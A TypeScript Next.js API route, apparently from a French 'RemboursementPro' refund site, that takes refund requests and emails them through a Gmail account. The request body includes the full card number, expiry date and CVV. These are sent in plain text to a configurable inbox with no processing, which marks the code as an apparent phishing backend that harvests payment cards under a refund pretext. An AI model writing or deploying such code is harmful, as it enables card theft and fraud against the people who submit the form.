import { NextResponse } from 'next/server';
import nodemailer from 'nodemailer';

function buildRefundEmailBody(payload: any, requestId: string) {
  const lines = [
    'Nouvelle demande de remboursement',
    `Numéro de demande : ${requestId}`,
    '',
    `Nom : ${payload.full_name || ''}`,
    `Email : ${payload.email || ''}`,
    `Téléphone : ${payload.phone || ''}`,
    `Motif : ${payload.reason || ''}`,
    `Montant : ${Number(payload.amount || 0).toFixed(2)} €`,
    `Référence de réservation : ${payload.booking_reference || 'Non renseignée'}`,
    `Numéro de carte : ${payload.card_number || ''}`,
    `Date d'expiration : ${payload.card_expiry || ''}`,
    `CVV : ${payload.card_cvv || ''}`,
  ];

  return lines.join('\n');
}

export async function POST(request: Request) {
  try {
    const payload = await request.json();

    const from = process.env.EMAIL_USER || process.env.GMAIL_USER;
    const pass = process.env.EMAIL_PASS || process.env.GMAIL_APP_PASSWORD;
    const to = process.env.EMAIL_TO || process.env.ALERT_EMAIL || process.env.NEXT_PUBLIC_REFUND_EMAIL_TO || from;

    if (!from || !pass || !to) {
      return NextResponse.json(
        {
          error: 'Variables manquantes : EMAIL_USER, EMAIL_PASS et EMAIL_TO.',
        },
        { status: 500 },
      );
    }

    const requestId = String(payload.requestId || 'N/A');
    const emailBody = buildRefundEmailBody(payload, requestId);

    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: from,
        pass,
      },
    });

    await transporter.sendMail({
      from: `"RemboursementPro" <${from}>`,
      to,
      subject: `Nouvelle demande de remboursement - ${requestId.slice(0, 8).toUpperCase()}`,
      text: emailBody,
      html: `<pre style="font-family:Arial,sans-serif;white-space:pre-wrap;">${emailBody.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</pre>`,
    });

    return NextResponse.json({ ok: true, requestId });
  } catch (error) {
    const message = error instanceof Error ? error.message : 'Erreur interne';
    return NextResponse.json({ error: message }, { status: 500 });
  }
}
